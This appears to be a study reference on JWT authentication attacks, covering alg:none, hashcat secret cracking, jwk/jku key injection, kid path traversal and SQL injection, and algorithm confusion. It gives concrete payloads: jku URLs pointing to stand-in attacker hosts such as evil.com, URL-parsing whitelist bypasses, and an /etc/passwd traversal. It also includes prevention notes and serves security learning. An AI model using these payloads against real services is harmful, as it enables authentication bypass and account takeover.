# JWT Attacks — Complete Reference

---

## What are JWTs?

JSON Web Tokens (JWTs) are a standardized way to send **cryptographically signed JSON data** between systems. They carry user information ("claims") for authentication, session handling, and access control.

**Structure:** `Header.Payload.Signature` — three Base64URL-encoded parts separated by dots.

```
eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImNhcmxvcyJ9.SYZBPIBg...
```

- **Header** — metadata (algorithm, key info)
- **Payload** — user claims (`sub`, `role`, `exp`, etc.)
- **Signature** — cryptographic proof of integrity

> ⚠️ Header and Payload are **readable by anyone** — security relies entirely on the signature.

---

## JWS vs JWE

| Feature       | JWS (Signed)                | JWE (Encrypted)             |
|---------------|-----------------------------|-----------------------------|
| Purpose       | Integrity + Authenticity    | Confidentiality             |
| Data readable?| ✅ Yes                      | ❌ No                       |
| Use case      | Auth tokens, API access     | Sensitive data (PII, payment)|
| Performance   | Faster                      | Slightly slower             |

**Remember:** JWS = "Trust it" · JWE = "Hide it" · High security = JWE + JWS together

---

## HS256 vs RS256 — Quick Reference

| Feature        | HS256 (Symmetric)           | RS256 (Asymmetric)                |
|----------------|-----------------------------|-----------------------------------|
| Key type       | Single shared secret        | Public + Private key pair         |
| Sign with      | Secret key                  | Private key                       |
| Verify with    | Same secret key             | Public key                        |
| Header params  | `kid`                       | `kid`, `jwk`, `jku`              |
| Attack surface | Secret brute-force, `kid`   | Key injection via `jwk`/`jku`/`kid`, algorithm confusion |

---

# Attack 1: Unverified Signature

**Applies to:** HS256, RS256

**Root Cause:** Server doesn't verify the signature at all.

Two common reasons:
1. **No server-side storage** — server can't verify who the actual user is
2. **Developer mistake** — using `decode()` instead of `verify()` in JWT libraries

**Attack:** Simply change the payload claims (e.g., `"sub": "admin"`), leave the original signature, and send it.

---

# Attack 2: `alg: none` — Signature Bypass

**Applies to:** HS256, RS256

**Root Cause:** Server doesn't reject unsigned tokens.

The JWT spec allows `"alg": "none"` for "unsecured JWTs." If the server accepts it:

```json
{ "alg": "none", "typ": "JWT" }
```

1. Change the header to `alg: none`
2. Modify payload to desired claims
3. Remove the signature but **keep the trailing dot**: `header.payload.`

**Bypassing filters:** If `none` is blocked, try obfuscation:
- `None`, `NONE`, `nOnE`, `NoNe`

---

# Attack 3: Weak Signing Key (Brute-Force)

**Applies to:** HS256 only

**Root Cause:** Developer uses a weak/guessable string as the HMAC secret.

> RS256 is NOT vulnerable — brute-forcing a 2048-bit RSA private key is infeasible.

**Attack with Hashcat:**
```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

Once cracked, forge a new token signed with the recovered secret.

---

# Attack 4: `jwk` Header Injection (Self-Signed JWT)

**Applies to:** RS256

**Root Cause:** Server trusts the public key embedded inside the token's `jwk` header.

### Vulnerable Flow

```
Attacker generates RSA keypair
    → Puts public key in jwk header
    → Signs token with private key
    → Server extracts jwk, verifies with attacker's key
    → Signature VALID ✅ → Auth bypass 💥
```

### Attack Steps

1. Generate your own RSA key pair (Burp JWT Editor)
2. Create header with your public key:
   ```json
   {
     "alg": "RS256",
     "jwk": {
       "kty": "RSA",
       "e": "AQAB",
       "n": "ATTACKER_PUBLIC_KEY_MODULUS"
     }
   }
   ```
3. Set payload: `{"sub": "admin"}`
4. Sign with **your** private key
5. Server uses your embedded public key → verifies → access granted

### Why It Works

This is a **trust boundary failure** — the server lets the token dictate which key to use for verification. The attacker controls both the key and the signature.

### Prevention
- ❌ Never use `jwk` from the token header
- ✅ Use only hardcoded/trusted public keys or a controlled JWKS endpoint

---

# Attack 5: `jku` Header Injection (Remote Key Fetch)

**Applies to:** RS256

**Root Cause:** Server fetches verification keys from a URL specified in the token header without validating the domain.

> `jku` = **JSON Web Key Set URL** — tells the server "download public keys from this URL to verify me."

### JWK Set Format
```json
{
  "keys": [
    { "kty": "RSA", "e": "AQAB", "kid": "abc123", "n": "xyz..." }
  ]
}
```

### Attack Steps

1. Generate your own RSA key pair
2. Host a JWKS file on `https://attacker.com/jwks.json` with your public key
3. Modify JWT header:
   ```json
   {
     "alg": "RS256",
     "jku": "https://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
4. Sign token with your private key
5. Server fetches keys from your URL → verifies → access granted 💥

### Prevention
- ✅ Whitelist allowed `jku` domains strictly
- ✅ Ignore `jku` from token; use server-configured JWKS endpoint
- ✅ Validate `kid` matches expected keys

---

## `jku` Whitelist Bypass via SSRF Tricks

If the server checks `if "trusted.com" in jku_url`, you can bypass with URL parsing confusion:

| Technique | Payload | Why It Works |
|-----------|---------|--------------|
| **@ (Credentials)** | `https://trusted.com@evil.com/jwks.json` | `trusted.com` treated as username, real host = `evil.com` |
| **# (Fragment)** | `https://evil.com#trusted.com` | Filter sees `trusted.com`, server ignores fragment |
| **Subdomain** | `https://trusted.com.evil.com/jwks.json` | Contains `trusted.com` string, DNS resolves to `evil.com` |
| **URL Encoding** | `https://trusted.com%40evil.com` | Filter checks raw string, server decodes to `@` |
| **Double Encoding** | `%2523` → decoded twice → `#` | Multi-layer decode confusion |

### Combined Attack
```json
{
  "alg": "RS256",
  "kid": "attacker-key",
  "jku": "https://trusted.com@evil.com/jwks.json"
}
```
Filter sees `trusted.com` ✅ → Actual request goes to `evil.com` → Auth bypass 💥

---

# Attack 6: `kid` Parameter Manipulation

**Applies to:** HS256 (primarily)

**Root Cause:** Server uses `kid` value unsafely in file reads or database queries.

`kid` is just a string with no strict rules — if the server does:
```python
key = open(kid).read()        # File-based lookup
```
```sql
SELECT key FROM keys WHERE id = 'kid'   -- DB-based lookup
```
…then you control what key the server loads.

### Case A — Path Traversal (`/dev/null`)

```json
{ "kid": "/dev/null", "alg": "HS256" }
```

- Server reads `/dev/null` → returns empty content → secret = `""`
- You sign the token with an empty string:
  ```python
  jwt.encode(payload, "", algorithm="HS256")
  ```
- Signatures match → **auth bypass** 💥

Also try: `../../../../dev/null`, `../../../../etc/passwd`

### Case B — SQL Injection

```json
{ "kid": "x' UNION SELECT 'my_secret_key'--" }
```

- Database returns `my_secret_key` as the signing key
- You sign the token with `my_secret_key` → bypass 💥

---

# Attack 7: Algorithm Confusion (RS256 → HS256)

**Applies to:** RS256 → HS256 switch

**Root Cause:** Server determines the verification algorithm from the token header instead of enforcing one.

### The Trick

1. Server normally uses RS256 (Public Key to verify)
2. Attacker changes header to `"alg": "HS256"`
3. Server's flawed code takes the Public Key and passes it to the HMAC verification function
4. Attacker signs the token using the **server's public key as the HMAC secret**
5. Signature matches → auth bypass 💥

### Attack Steps

1. Obtain the server's public key (from `/.well-known/jwks.json`, certificates, etc.)
2. Change header: `{"alg": "HS256"}`
3. Modify payload to admin claims
4. Sign using the public key string as the HMAC secret

> ⚠️ The exact format of the public key (PEM, newlines, encoding) must match what the server passes internally.

---

# 🔍 Pentesting Workflow — When You Find a JWT

```
1. Decode JWT → identify algorithm
2. Try alg:none → remove signature
3. If HS256 → brute-force the secret (Hashcat/jwt_tool)
4. If RS256 → try:
   ├── Inject jwk (self-signed key)
   ├── Inject jku (remote key URL)
   ├── Manipulate kid (path traversal / SQLi)
   └── Algorithm confusion (RS256 → HS256)
5. Even if jwk/jku/kid are NOT present → add them manually and test
6. Observe server behavior for each injection
```

| Server Response          | Meaning            |
|--------------------------|--------------------|
| ❌ "Invalid signature"   | Server ignores injection — safe |
| ⚠️ Different/unusual error | Server is processing your input |
| ✅ Success               | **VULNERABLE**     |

---

# 🎯 Interview-Ready Statements

> **jwk injection:** "An attacker embeds their own public key in the JWT header and signs with their private key. If the server trusts the embedded jwk, the signature validates and the attacker achieves full token forgery."

> **jku injection:** "An attacker points the jku header to a URL they control hosting their own public key. If the server fetches keys from untrusted URLs, the attacker's signature validates."

> **kid manipulation:** "An attacker modifies the kid parameter to exploit path traversal or SQL injection in the server's key lookup, forcing it to use a predictable or empty key for verification."

> **Algorithm confusion:** "An attacker switches the algorithm from RS256 to HS256, causing the server to use its own public key as an HMAC secret — which the attacker already knows."
